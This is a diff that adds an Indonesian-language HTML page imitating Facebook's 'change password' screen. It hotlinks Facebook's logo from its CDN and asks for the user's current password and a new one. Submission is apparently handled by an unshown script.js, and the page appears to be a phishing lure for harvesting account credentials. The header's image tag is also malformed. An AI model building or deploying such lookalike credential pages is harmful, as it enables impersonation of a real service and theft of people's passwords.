@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ubah Kata Sandi</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img class" accesskey=""src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" h1>
+        </header>
+        <main>
+            <h2>Ubah kata sandi</h2>
+            <p>Kata sandi Anda harus paling tidak 6 karakter.</p>
+            <form id="passwordForm">
+                <label for="currentPassword">Kata sandi saat ini</label>
+                <input type="password" id="currentPassword" placeholder="Masukkan kata sandi saat ini" required>
+
+                <label for="newPassword">Kata sandi baru</label>
+                <input type="password" id="newPassword" placeholder="Masukkan kata sandi baru" required>
+
+                <label for="confirmPassword">Tulis ulang kata sandi baru</label>
+                <input type="password" id="confirmPassword" placeholder="Ulangi kata sandi baru" required>
+
+                <div class="checkbox">
+                    <input type="checkbox" id="logoutOtherDevices" checked>
+                    <label for="logoutOtherDevices">Logout dari perangkat lain. Pilih ini jika orang lain menggunakan akun Anda.</label>
+                </div>
+
+                <button type="submit">Ubah kata sandi</button>
+            </form>
+            <a href="#" class="forgot-password">Lupa kata sandi Anda?</a>
+        </main>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
